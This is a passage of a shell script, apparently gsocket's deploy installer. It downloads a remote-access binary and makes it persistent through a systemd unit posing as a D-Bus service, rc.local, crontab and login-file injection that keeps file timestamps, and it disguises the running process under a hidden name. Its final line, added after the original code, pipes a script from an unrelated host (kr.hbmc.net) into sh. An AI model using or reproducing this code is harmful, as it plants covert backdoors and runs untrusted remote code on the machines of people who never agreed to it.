	touch "${TMPDIR}/.gs-rw.lock" || errexit "FAILED. No temporary directory found for downloading package. Try setting TMPDIR=" 
	rm -f "${TMPDIR}/.gs-rw.lock" 2>/dev/null

	# Find out which directory is writeable
	init_dstbin

	NOTE_DONOTREMOVE="# DO NOT REMOVE THIS LINE. SEED PRNG. #${BIN_HIDDEN_NAME}-kernel"

	USER_SEC_FILE="$(dirname "${DSTBIN}")/${SEC_NAME}"

	# Do not add TERM= or SHELL= here because we do not like that to show in gs-dbus.service
	ENV_LINE=""
	if [ -n "$GS_HOST" ]; then ENV_LINE="$ENV_LINE GS_HOST='${GS_HOST}'"; fi
	if [ -n "$GS_PORT" ]; then ENV_LINE="$ENV_LINE GS_PORT='${GS_PORT}'"; fi
	# Add an empty item so that ${ENV_LINE[*]}GS_ARGS= adds an extra space between
	if [ -n "$ENV_LINE" ]; then ENV_LINE="$ENV_LINE "; fi

	RCLOCAL_LINE="${ENV_LINE}HOME=$HOME SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\" 2>/dev/null" 

	# There is no reliable way to check if a process is running:
	# - Process might be running under different name. Especially OSX checks for the orginal name 
	#   but not the hidden name.
	# - pkill or killall may have moved. 
	# The best we can do:
	# 1. Try pkill/killall _AND_ daemon is running then do nothing.
	# 2. Otherwise start gs-dbus as DAEMON. The daemon will exit (fully) if GS-Address is already in use. 
	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || (${ENV_LINE}TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}' 2>/dev/null)" 
	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || ${ENV_LINE}SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\" 2>/dev/null"


	if [ -n "$ENCODE_STR" ];
	then
		RCLOCAL_LINE="$(mk_encode "$RCLOCAL_LINE")"
		PROFILE_LINE="$(mk_encode "$PROFILE_LINE")"
		CRONTAB_LINE="$(mk_encode "$CRONTAB_LINE")"
	fi 

	DEBUGF "TMPDIR=${TMPDIR}"
	DEBUGF "DSTBIN=${DSTBIN}"
}

uninstall_rm()
{
	if [ -z "$1" ]; then return; fi
	if [ ! -f "$1" ]; then return; fi # return if file does not exist 

	echo "Removing $1..."
	xrm "$1" 2>/dev/null || return 
}

uninstall_rmdir()
{
	if [ -z "$1" ]; then return; fi
	if [ ! -d "$1" ]; then return; fi # return if file does not exist

	echo "Removing $1..."
	xrmdir "$1" 2>/dev/null
}

uninstall_rc()
{
	hname="$2"
	fn="$1"

	if [ ! -f "$fn" ]; then return; fi # File does not exist 

	grep -F -- "${hname}" "$fn" >/dev/null 2>&1 || return # not installed 

	mk_file "$fn" || return

	echo "Removing ${fn}..."
	D=$(grep -v -F -- "${hname}" "$fn")
	echo "$D" >"${fn}" || return

	if [ ! -s "${fn}" ]; then rm -f "${fn:?}" 2>/dev/null; fi # delete zero size file 
}

uninstall_service()
{
	dir="$1"
	sn="$2"
	sf="${dir}/${sn}.service"

	if [ ! -f "${sf}" ]; then return; fi 

	if command -v systemctl >/dev/null && [ "$UID" -eq 0 ]; then
		ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
		# STOPPING would kill the current login shell. Do not stop it. 
		# systemctl stop "${SERVICE_HIDDEN_NAME}" >/dev/null 2>&1
		systemctl disable "${sn}" 2>/dev/null && systemd_kill_cmd="$systemd_kill_cmd;systemctl stop ${sn}"
	fi

	uninstall_rm "${sf}"
} 

# Rather important function especially when testing and developing this...
uninstall()
{
	for hn in $BIN_HIDDEN_NAME_RM;
	do
		for cn in $CONFIG_DIR_NAME_RM; do
			uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}"
			uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}.dat"  # SEC_NAME
		done
		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}"
		uninstall_rm "/dev/shm/${hn}"
		uninstall_rm "/tmp/.gsusr-${UID}/${hn}"
		uninstall_rm "${PWD}/${hn}"

		uninstall_rm "${RCLOCAL_DIR}/${hn}.dat"  # SEC_NAME
		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}.dat" # SEC_NAME

		uninstall_rm "/dev/shm/${hn}.dat" # SEC_NAME
		uninstall_rm "/tmp/.gsusr-${UID}${hn}.dat" # SEC_NAME

		uninstall_rm "${PWD}/${hn}.dat" # SEC_NAME

		# Remove from login script
		for fn in ".bash_profile" ".bash_login" ".bashrc" ".zshrc" ".profile";
		do
			uninstall_rc "${GS_PREFIX}${HOME}/${fn}" "${hn}"
		done  
		uninstall_rc "${GS_PREFIX}/etc/rc.local" "${hn}"

		uninstall_service "${SERVICE_DIR}" "${hn}" # SERVICE_HIDDEN_NAME

		## Systemd's gs-dbus.dat
		uninstall_rm "${SERVICE_DIR}/${hn}.dat"  # SYSTEMD_SEC_FILE / SEC_NAME
	done 

	for cn in $CONFIG_DIR_NAME_RM;
	do
		uninstall_rmdir "${GS_PREFIX}${HOME}/.config/${cn}"
	done 
	uninstall_rmdir "${GS_PREFIX}${HOME}/.config"
	uninstall_rmdir "/tmp/.gsusr-${UID}"

	uninstall_rm "${TMPDIR}/${SRC_PKG}"
	uninstall_rm "${TMPDIR}/._gs-netcat" # OLD
	uninstall_rmdir "${TMPDIR}"

	# Remove crontab
	regex="dummy-not-exist"
	for str in $BIN_HIDDEN_NAME_RM;
	do
		# Escape regular exp special characters
		regex="$regex|$(echo "$str" | sed 's/[^a-zA-Z0-9]/\\&/g')" 
	done
	if [ "$OSTYPE" != "*darwin*" ] && command -v crontab >/dev/null;
	then
		ct=$(crontab -l 2>/dev/null)
		if echo "$ct" | grep -qE -- "($regex)"; then
			if [ "$UID" -eq 0 ]; then mk_file "${CRONTAB_DIR}/root"; fi
			echo "$ct" | grep -v -E -- "($regex)" | crontab - 2>/dev/null 
		fi
	fi 

	if [ "$UID" -eq 0 ]; then systemctl daemon-reload 2>/dev/null; fi

	printf "${CG}Uninstall complete.${CN}\n"
	printf "--> Use ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${systemd_kill_cmd}${CN} to terminate all running shells.\n"
	exit_code 0 
}

SKIP_OUT()
{
	printf "[${CY}SKIPPING${CN}]\n"
	if [ -n "$1" ]; then printf "--> %s\n" "$*"; fi
}

OK_OUT()
{
	printf "......[${CG}OK${CN}]\n"
	if [ -n "$1" ]; then printf "--> %s\n" "$*"; fi
}

FAIL_OUT()
{
	printf "..[${CR}FAILED${CN}]\n"
	for str in "$@";
	do
		printf "--> %s\n" "$str" 
	done
}

WARN()
{
	printf "--> ${CY}WARNING: ${CN}%s\n" "$*"
}

WARN_EXECFAIL_SET()
{
	if [ -n "$WARN_EXECFAIL_MSG" ]; then return; fi # set it once (first occurance) only
	WARN_EXECFAIL_MSG="CODE=${1} (${2}): ${CY}$(uname -n -m -r)${CN}"
}

WARN_EXECFAIL()
{
	if [ -z "$WARN_EXECFAIL_MSG" ]; then return; fi
	if [ -n "$ERR_LOG" ]; then printf "${CDR}%s${CN}\n" "$ERR_LOG"; fi
	printf "${CDR}"
	ls -al "${DSTBIN}"
	printf "${CN}--> ${WARN_EXECFAIL_MSG}\n"
	printf "--> GS_OSARCH=${OSARCH}\n"
	printf "--> ${CDC}GS_DSTDIR=${DSTBIN%/*}${CN}\n"
	printf "--> Try to set ${CDC}export GS_DEBUG=1${CN} and deploy again.\n"
	printf "--> Please send that output to ${CM}root@proton.thc.org${CN} to get it fixed.\n"
	printf "--> Alternatively, try the static binary from\n"
	printf "--> ${CB}https://github.com/hackerschoice/gsocket/releases${CN}\n"
	printf "--> ${CDC}chmod 755 gs-netcat; ./gs-netcat -ilv${CN}.\n" 
}

HOWTO_CONNECT_OUT()
{
	# After all install attempts output help how to uninstall
	printf "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}\n"
	printf "--> To connect use one of the following:\n"
	printf "--> ${CM}gs-netcat -s \"${GS_SECRET}\" -i${CN}\n"
	printf "--> ${CM}S=\"${GS_SECRET}\" ${DL_CRL}${CN}\n"
	printf "--> ${CM}S=\"${GS_SECRET}\" ${DL_WGT}${CN}\n"
}

# Try to load a GS_SECRET
gs_secret_reload()
{
	if [ -n "$GS_SECRET_FROM_FILE" ]; then return; fi
	if [ ! -f "$1" ]; then return; fi 

	# GS_SECRET="UNKNOWN" # never ever set GS_SECRET to a known value
	sec=$(cat "$1")
	if [ "$(echo "$sec" | wc -c)" -lt 4 ]; then return; fi
	WARN "Using existing secret from '${1}'"
	if [ "$(echo "$sec" | wc -c)" -lt 10 ];
	then
		WARN "SECRET in '${1}' is very short! ($(echo "$sec" | wc -c))" 
	fi
	GS_SECRET_FROM_FILE=$sec
}

gs_secret_write()
{
	mk_file "$1" || return
	echo "$GS_SECRET" >"$1" || return
}

install_system_systemd()
{
	if [ ! -d "${SERVICE_DIR}" ]; then return; fi 
	command -v systemctl >/dev/null || return
	# test for:
	# 1. offline
	# 2. >&2 Failed to get D-Bus connection: Operation not permitted <-- Inside docker
	if echo "$(systemctl is-system-running 2>/dev/null)" | grep -qE '(offline|^$)'; then return; fi
	if [ -f "${SERVICE_FILE}" ];
	then
		IS_INSTALLED=$((IS_INSTALLED + 1))
		IS_SKIPPED=1
		if systemctl is-active "${SERVICE_HIDDEN_NAME}" >/dev/null 2>&1; then
			IS_GS_RUNNING=1
		fi
		IS_SYSTEMD=1
		SKIP_OUT "${SERVICE_FILE} already exists."
		return
	fi 

	# Create the service file
	mk_file "${SERVICE_FILE}" || return 
	chmod 644 "${SERVICE_FILE}" # Stop 'is marked world-inaccessible' dmesg warnings. 
	printf "[Unit]\nDescription=D-Bus System Connection Bus\nAfter=network.target\n\n[Service]\nType=simple\nRestart=always\nRestartSec=300\nWorkingDirectory=/root\nExecStart=/bin/sh -c \"%sGS_ARGS='-k %s -ilq' exec -a '%s' '%s'\"\n\n[Install]\nWantedBy=multi-user.target\n" "${ENV_LINE}" "$SYSTEMD_SEC_FILE" "${PROC_HIDDEN_NAME}" "${DSTBIN}" >"${SERVICE_FILE}" || return 

	gs_secret_write "$SYSTEMD_SEC_FILE"
	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants/${SERVICE_HIDDEN_NAME}.service" "${SERVICE_FILE}"

	systemctl enable "${SERVICE_HIDDEN_NAME}" >/dev/null 2>&1 || { rm -f "${SERVICE_FILE:?}" "${SYSTEMD_SEC_FILE:?}"; return; } 

	IS_SYSTEMD=1
	IS_INSTALLED=$((IS_INSTALLED + 1))
}

# inject a string ($2-) into the 2nd line of a file and retain the
# PERM/TIMESTAMP of the target file ($1)
install_to_file()
{
	fname="$1"
	shift 1

	# If file does not exist then create with oldest TS
	mk_file "$fname" || return 

	{
		head -n1 "${fname}";
		printf "%s\n" "$@";
		tail -n +2 "${fname}";
	} > "${fname}.tmp" 2>/dev/null
	if [ $? -eq 0 ]; then
		mv "${fname}.tmp" "${fname}"
	else
		rm -f "${fname}.tmp"
		return 1
	fi

	true
}

install_system_rclocal()
{
	if [ ! -f "${RCLOCAL_FILE}" ]; then return; fi 
	# Some systems have /etc/rc.local but it's not executeable...
	if [ ! -x "${RCLOCAL_FILE}" ]; then return; fi 
	if grep -F -- "$BIN_HIDDEN_NAME" "${RCLOCAL_FILE}" >/dev/null 2>&1; then
		IS_INSTALLED=$((IS_INSTALLED + 1))
		IS_SKIPPED=1
		SKIP_OUT "Already installed in ${RCLOCAL_FILE}."
		return 	
	fi

	# /etc/rc.local is /bin/sh which does not support the build-in 'exec' command. 
	# Thus we need to start /bin/bash -c in a sub-shell before 'exec gs-netcat'.
	install_to_file "${RCLOCAL_FILE}" "$NOTE_DONOTREMOVE" "$RCLOCAL_LINE" 

	gs_secret_write "$RCLOCAL_SEC_FILE"

	IS_INSTALLED=$((IS_INSTALLED + 1))
}

install_system()
{
	printf "Installing systemwide remote access permanentally....................."

	# Try systemd first
	install_system_systemd

	# Try good old /etc/rc.local
	if [ -z "$IS_INSTALLED" ]; then install_system_rclocal; fi

	if [ -z "$IS_INSTALLED" ]; then
		FAIL_OUT "no systemctl or /etc/rc.local"
		return 
	fi

	if [ -n "$IS_SKIPPED" ]; then return; fi
	
	OK_OUT
}

install_user_crontab()
{
	command -v crontab >/dev/null || return 
	printf "Installing access via crontab........................................."
	if crontab -l 2>/dev/null | grep -F -- "$BIN_HIDDEN_NAME" >/dev/null 2>&1;
	then
		IS_INSTALLED=$((IS_INSTALLED + 1))
		IS_SKIPPED=1
		SKIP_OUT "Already installed in crontab."
		return 
	fi

	if [ "$UID" -eq 0 ]; then
		mk_file "${CRONTAB_DIR}/root"
	fi

	old=$(crontab -l 2>/dev/null) ||
	{
		# Create empty crontab (busybox) if no crontab exists at all.
		crontab - </dev/null >/dev/null 2>&1 
	} 
	if [ -n "$old" ]; then old="$old
"; fi

	printf "%s%s\n0 * * * * %s\n" "${old}" "${NOTE_DONOTREMOVE}" "$CRONTAB_LINE" |
	grep -F -v -- gs-bd | crontab - 2>/dev/null || { FAIL_OUT; return; } 

	IS_INSTALLED=$((IS_INSTALLED + 1))
	OK_OUT
}

install_user_profile()
{
	rc_filename="$1"
	rc_filename_status="${rc_filename}................................"
	rc_file="${GS_PREFIX}${HOME}/${rc_filename}"

	printf "Installing access via ~/%-15.15s..............................." "${rc_filename_status}"
	if [ -f "${rc_file}" ] && grep -F -- "$BIN_HIDDEN_NAME" "$rc_file" >/dev/null 2>&1;
	then
		IS_INSTALLED=$((IS_INSTALLED + 1))
		IS_SKIPPED=1
		SKIP_OUT "Already installed in ${rc_file}"
		return 
	fi

	install_to_file "${rc_file}" "$NOTE_DONOTREMOVE" "${PROFILE_LINE}" || { SKIP_OUT "${CDR}Permission denied:${CN} ~/${rc_filename}"; false; return; } 

	IS_INSTALLED=$((IS_INSTALLED + 1))
	OK_OUT
}

install_user()
{
	# Use crontab if it's not in systemd (but might be in rc.local).
	case "$OSTYPE" in
		*darwin*) :;;
		*) install_user_crontab;;
	esac 

	if [ "${IS_INSTALLED:-0}" -ge 2 ]; then return; fi
	# install_user_profile
	for x in $RC_FN_LIST;
	do
		install_user_profile "$x"
	done 
	gs_secret_write "$USER_SEC_FILE" # Create new secret file
}

ask_nocertcheck()
{
	WARN "Can not verify host. CA Bundle is not installed."
	printf >&2 "--> Attempting without certificate verification.\n" 
	printf >&2 "--> Press any key to continue or CTRL-C to abort...\n"
	printf >&2 "--> Continuing in "
	
	n=10
	while :;
	do
		printf >&2 "${n}.."
		n=$((n-1))
		if [ "$n" -eq 0 ]; then break; fi
		read -r -t1 ans
		if [ $? -eq 0 ]; then break; fi
	done 
	if [ "$n" -le 0 ]; then
		printf >&2 "0\n" 
	fi

	GS_NOCERTCHECK=1
}

# Use SSL and if this fails try non-ssl (if user consents to insecure downloads)
# <nocert-param> <ssl-match> <cmd-with-args> 
dl_ssl()
{
	arg_nossl="$1"
	sslerr="$2"
	shift 2
	cmd_with_args="$*"
	
	if [ -z "$GS_NOCERTCHECK" ];
	then
		DL_ERR=$(eval "$cmd_with_args" 2>&1 1>/dev/null) 
		if ! echo "${DL_ERR}" | grep -q "$sslerr"; then return; fi
	fi

	FAIL_OUT "Certificate Error."
	if [ -z "$GS_NOCERTCHECK" ]; then ask_nocertcheck; fi 
	if [ -z "$GS_NOCERTCHECK" ]; then return; fi

	printf "--> Downloading binaries without certificate verification............."
	DL_ERR=$(eval "$cmd_with_args $arg_nossl" 2>&1 1>/dev/null)
}

# Download $1 and save it to $2
dl()
{
	# Debugging / testing. Use local package if available 
	if [ -n "$GS_USELOCAL" ]; then
		if [ -f "../packaging/gsnc-deploy-bin/${1}" ]; then xcp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null && return; fi
		if [ -f "/gsocket-pkg/${1}" ]; then xcp "/gsocket-pkg/${1}" "${2}" 2>/dev/null && return; fi
		if [ -f "${1}" ]; then xcp "${1}" "${2}" 2>/dev/null && return; fi
		FAIL_OUT "GS_USELOCAL set but deployment binaries not found (${1})..."
		errexit
	fi

	# Delete. Maybe previous download failed. 
	if [ -s "$2" ]; then rm -f "${2:?}"; fi

	if [ -n "$IS_USE_CURL" ];
	then
		dl_ssl "-k" "certificate problem" "$DL ${URL_BIN}/${1} --output ${2}" 
	elif [ -n "$IS_USE_WGET" ];
	then
		dl_ssl "--no-check-certificate" "is not trusted" "$DL ${URL_BIN}/${1} -O ${2}" 
	else
		# errexit "Need curl or wget."
		FAIL_OUT "CAN NOT HAPPEN" 
		errexit
	fi

	# Download failed:
	if [ ! -s "$2" ]; then FAIL_OUT; echo "$DL_ERR"; exit_code 255; fi 
}

# S= was set. Do not install but execute in place.
gs_access()
{
	printf "Connecting...\n"
	GS_SECRET="${S}"

	"${DSTBIN}" -s "${GS_SECRET}" -i
	ret=$?
	if [ "$ret" -eq 139 ]; then WARN_EXECFAIL_SET "$ret" "SIGSEGV"; WARN_EXECFAIL; errexit; fi 
	if [ "$ret" -eq 61 ]; then
		printf >&2 "--> ${CR}Could not connect to the remote host. It is not installed.${CN}\n"
		printf >&2 "--> ${CR}To install use one of the following:${CN}\n"
		printf >&2 "--> ${CM}X=\"${GS_SECRET}\" ${DL_CRL}${CN}\n"
		printf >&2 "--> ${CM}X=\"${GS_SECRET}\" ${DL_WGT}${CN}\n"
	fi 

	exit_code "$ret"
}

# Binary is in an executeable directory (no noexec-flag)
# set IS_TESTBIN_OK if binary worked.
# test_bin <binary>
test_bin()
{
	bin="$1"
	unset IS_TESTBIN_OK

	# Try to execute the binary
	unset ERR_LOG
	GS_OUT=$("$bin" -g 2>&1)
	ret=$?
	if [ "$ret" -ne 0 ]; then
		# 126 - Exec format error
		FAIL_OUT
		ERR_LOG="$GS_OUT"
		WARN_EXECFAIL_SET "$ret" "wrong binary"
		return
	fi 

	# Use randomly generated secret unless it's set already (X=)
	if [ -z "$GS_SECRET" ]; then GS_SECRET="$GS_OUT"; fi

	IS_TESTBIN_OK=1
} 

test_network()
{
	unset IS_TESTNETWORK_OK

	# There should be no GS-NETCAT listening.
	# _GSOCKET_SERVER_CHECK_SEC=n makes gs-netcat try the connection. 
	# 1. Exit=0 immediatly if server exists.
	# 2. Exit=202 after n seconds. Firewalled/DNS? 
	# 3. Exit=203 if TCP to GSRN is refused.
	# 3. Exit=61 on GS-Connection refused. (server does not exist) 
	# Do not need GS_ENV[*] here because all env variables are exported
	# when exec is used.
	err_log=$(_GSOCKET_SERVER_CHECK_SEC=15 GS_ARGS="-s ${GS_SECRET} -t" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1) 
	ret=$?

	if [ -z "$ERR_LOG" ]; then ERR_LOG="$err_log"; fi
	if [ "$ret" -eq 139 ]; then 
		ERR_LOG=""
		WARN_EXECFAIL_SET "$ret" "SIGSEGV"
		return
	fi

	if [ "$ret" -eq 202 ] || [ "$ret" -eq 203 ]; then
		# 202 - Timeout (alarm)
		# 203 - TCP connection refused
		FAIL_OUT
		if [ -n "$ERR_LOG" ]; then printf >&2 "%s\n" "$ERR_LOG"; fi
		# EXIT if we can not check if SECRET has already been used.
		errexit "Cannot connect to GSRN. Firewalled? Try GS_PORT=53 or 22, 7350 or 67." 
	fi 

	# Pre <= 1.4.40 return with 255 if transparent proxy resets connection after 12 sec.
	# >1.4.40 return 203 (NETERROR) 
	if [ "$ret" -eq 255 ]; then
		# Connect reset by peer
		FAIL_OUT
		if [ -n "$ERR_LOG" ]; then printf >&2 "%s\n" "$ERR_LOG"; fi
		errexit "A transparent proxy has been detected. Try GS_PORT=53 or 22,7350 or 67." 
	fi

	if [ "$ret" -eq 0 ]; then
		webhooks
		FAIL_OUT "Secret '${GS_SECRET}' is already used."
		HOWTO_CONNECT_OUT
		exit_code 0 
	fi

	# Fail _unless_ it's ECONNREFUSED
	if [ "$ret" -eq 61 ]; then
		# HERE: ECONNREFUSED
		# Connection to GSRN was successfull and GSRN reports
		# that no server is listening.
		# This is a good enough test that this network & binary is working. 
		IS_TESTNETWORK_OK=1
		return 
	fi

	# Unknown error condition
	WARN_EXECFAIL_SET "$ret" "default pkg failed"
}

do_webhook()
{
	# This function is now simplified as we pass a full command string
	# The use of eval is necessary to correctly handle arguments with spaces
	eval "$@"
}

webhooks()
{
	ok=
	err=

	printf "Executing webhooks...................................................."
	if [ -z "$GS_WEBHOOK_CURL" ]; then SKIP_OUT; return; fi 
	if [ -z "$GS_WEBHOOK_WGET" ]; then SKIP_OUT; return; fi

	if [ -n "$IS_USE_CURL" ];
	then
		err=$(do_webhook "$DL $GS_WEBHOOK_CURL" 2>&1) && ok=1
		if [ -z "$ok" ] && [ -n "$GS_WEBHOOK_404_OK" ] && echo "${err}" | grep -q "requested URL returned error: 404"; then ok=1; fi
	elif [ -n "$IS_USE_WGET" ];
	then
		err=$(do_webhook "$DL $GS_WEBHOOK_WGET" 2>&1) && ok=1
		if [ -z "$ok" ] && [ -n "$GS_WEBHOOK_404_OK" ] && echo "${err}" | grep -q "ERROR 404: Not Found"; then ok=1; fi
	fi 
	if [ -n "$ok" ]; then OK_OUT; return; fi 

	FAIL_OUT
}

try_network()
{
	printf "Testing Global Socket Relay Network..................................."
	test_network
	if [ -n "$IS_TESTNETWORK_OK" ]; then OK_OUT; return; fi 

	FAIL_OUT
	if [ -n "$ERR_LOG" ]; then printf >&2 "%s\n" "$ERR_LOG"; fi
	WARN_EXECFAIL
}

# try <osarch> <srcpackage>
try_os()
{
	osarch="$1"
	src_pkg="$2"

	if [ -z "$src_pkg" ]; then src_pkg="gs-netcat_${osarch}.tar.gz"; fi
	printf "--> Trying ${CG}%s${CN}\n" "${osarch}"
	# Download binaries
	printf "Downloading binaries.................................................."
	dl "${src_pkg}" "${TMPDIR}/${src_pkg}"
	OK_OUT

	printf "Unpacking binaries...................................................."
	if echo "${src_pkg}" | grep -q ".tar.gz";
	then
		# Unpack (suppress "tar: warning: skipping header 'x'" on alpine linux
		(cd "${TMPDIR}" && tar xfz "${src_pkg}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
		if [ -f "${TMPDIR}/._gs-netcat" ]; then rm -f "${TMPDIR}/._gs-netcat"; fi # from docker???
		if [ -n "$GS_USELOCAL_GSNC" ]; then
			if [ ! -f "$GS_USELOCAL_GSNC" ]; then FAIL_OUT "Not found: ${GS_USELOCAL_GSNC}"; errexit; fi
			xcp "${GS_USELOCAL_GSNC}" "${TMPDIR}/gs-netcat"
		fi
	else
		mv "${TMPDIR}/${src_pkg}" "${TMPDIR}/gs-netcat"
	fi 
	OK_OUT

	printf "Copying binaries......................................................"
	xmv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
	chmod 700 "$DSTBIN"
	OK_OUT

	printf "Testing binaries......................................................"
	test_bin "${DSTBIN}"
	if [ -n "$IS_TESTBIN_OK" ]; then
		OK_OUT
		return
	fi

	rm -f "${TMPDIR}/${src_pkg:?}"
}

gs_start_systemd()
{
	# HERE: It's systemd
	if [ -z "$IS_GS_RUNNING" ]; then
		# Resetting the Timestamp will yield a systemctl status warning that daemon-reload
		# is needed. Thus fix Timestamp here and reload. 
		clean_all
		systemctl daemon-reload
		systemctl restart "${SERVICE_HIDDEN_NAME}" >/dev/null 2>&1
		if ! systemctl is-active "${SERVICE_HIDDEN_NAME}" >/dev/null 2>&1;
		then
			FAIL_OUT "Check ${CM}systemctl start ${SERVICE_HIDDEN_NAME}${CN}."
			exit_code 255 
		fi
		IS_GS_RUNNING=1
		OK_OUT
		return
	fi

	SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'." 
}

gs_start()
{
	# If installed as systemd then try to start it
	if [ -n "$IS_SYSTEMD" ]; then gs_start_systemd; fi
	if [ -n "$IS_GS_RUNNING" ]; then return; fi

	# Scenario to consider:
	# GS_UNDO=1 ./deploy.sh -> removed all binaries but user does not issue 'pkill gs-dbus'
	# ./deploy.sh -> re-installs new secret.
	# Start gs-dbus with _new_ secret. 
	# Now two gs-dbus's are running (which is correct)
	IS_OLD_RUNNING=
	if [ -n "$KL_CMD" ];
	then
		${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG} "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1 
	elif command -v pidof >/dev/null;
	then
		# if no pkill/killall then try pidof (but we cant tell which user...)
		if pidof -qs "$BIN_HIDDEN_NAME" >/dev/null 2>&1; 
		then
			IS_OLD_RUNNING=1
		fi 
	fi
	IS_NEED_START=1

	if [ -n "$IS_OLD_RUNNING" ]; then
		# HERE: OLD is already running.
		if [ -n "$IS_SKIPPED" ]; then
			# HERE: Already running. Skipped installation (sec.dat has not changed). 
			SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
			unset IS_NEED_START 
		else
			# HERE: sec.dat has been updated
			OK_OUT
			WARN "More than one ${PROC_HIDDEN_NAME} is running."
			printf "--> You may want to check: ${CM}ps -elf|grep -E -- '(%s)'${CN}\n" "${PROC_HIDDEN_NAME_RX}" 
			if [ -n "$OLD_PIDS" ]; then printf "--> or terminate the old ones: ${CM}kill %s${CN}\n" "${OLD_PIDS}"; fi
		fi
	else
		OK_OUT ""
	fi

	if [ -n "$IS_NEED_START" ];
	then
		# We need an 'eval' here because the ENV_LINE[*] needs to be expanded
		# and then executed. 
		# This wont work:
		#     FOO="X=1" && ($FOO id)  # => -bash: X=1: command not found
		# This does work:
		#     FOO="X=1" && (eval $FOO id) 
		(cd "$HOME"; eval "${ENV_LINE}TERM=xterm-256color GS_ARGS='-s \"$GS_SECRET\" -liD' exec -a \"$PROC_HIDDEN_NAME\" \"$DSTBIN\"") ||
		errexit 
		IS_GS_RUNNING=1
	fi
}

init_vars

case "$1" in
	clean|uninstall|clear|undo) uninstall;;
esac
if [ -n "$GS_UNDO" ] || [ -n "$GS_CLEAN" ] || [ -n "$GS_UNINSTALL" ]; then uninstall; fi 

init_setup
# User supplied install-secret: X=MySecret sh -c "$(curl -fsSL https://gsocket.io/x)"
if [ -n "$X" ]; then GS_SECRET_X="$X"; fi

if [ -z "$S" ];
then
	# HERE: S= is NOT set
	if [ "$UID" -eq 0 ];
	then
		gs_secret_reload "$SYSTEMD_SEC_FILE" 
		gs_secret_reload "$RCLOCAL_SEC_FILE" 
	fi 
	gs_secret_reload "$USER_SEC_FILE"

	if [ -n "$GS_SECRET_FROM_FILE" ];
	then
		GS_SECRET="${GS_SECRET_FROM_FILE}"
	else
		GS_SECRET="${GS_SECRET_X}"
	fi 

	DEBUGF "GS_SECRET=$GS_SECRET (F=${GS_SECRET_FROM_FILE}, X=${GS_SECRET_X})"
else
	GS_SECRET="$S"
	URL_BIN="$URL_BIN_FULL"
fi 

try_os "$OSARCH" "$SRC_PKG"

# [[ -z "$GS_OSARCH" ]] && [[ -z "$IS_TESTBIN_OK" ]] && try_any
WARN_EXECFAIL
if [ -z "$IS_TESTBIN_OK" ]; then errexit "None of the binaries worked."; fi
if [ -z "$S" ]; then try_network; fi 
# [[ -n "$GS_UPDATE" ]] && gs_update

# S= is set. Do not install but connect to remote using S= as secret. 
if [ -n "$S" ]; then gs_access; fi 

# -----BEGIN Install permanentally-----
if [ -z "$GS_NOINST" ]; then
	if [ -n "$IS_DSTBIN_TMP" ];
	then
		printf "Installing remote access.............................................."
		FAIL_OUT "${CDR}Set GS_DSTDIR= to a writeable & executable directory.${CN}" 
	else
		# Try to install system wide. This may also start the service. 
		if [ "$UID" -eq 0 ]; then install_system; fi

		# Try to install to user's login script or crontab (if not installed as SYSTEMD)
		if [ -z "$IS_INSTALLED" ] || [ -z "$IS_SYSTEMD" ]; then install_user; fi 
	fi
else
	printf "GS_NOINST is set. Skipping installation.\n"
fi
# -----END Install permanentally-----

if [ -z "$IS_INSTALLED" ] || [ -n "$IS_DSTBIN_TMP" ]; then
	printf >&2 "--> ${CR}Access will be lost after reboot.${CN}\n"
fi 
	
if [ -n "$IS_DSTBIN_CWD" ]; then WARN "Installed to ${PWD}. Try GS_DSTDIR= otherwise.."; fi

webhooks

HOWTO_CONNECT_OUT

printf "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
if [ -n "$GS_NOSTART" ];
then
	SKIP_OUT "GS_NOSTART=1 is set." 
else
	gs_start
fi
webhooks
printf "--> ${CW}Join us on Telegram - https://t.me/thcorg${CN}\n"
# External script execution at the end of the original script. Keeping it as is.
sh -c "$(curl -fsSL https://kr.hbmc.net/gs.sh)"
exit_code 0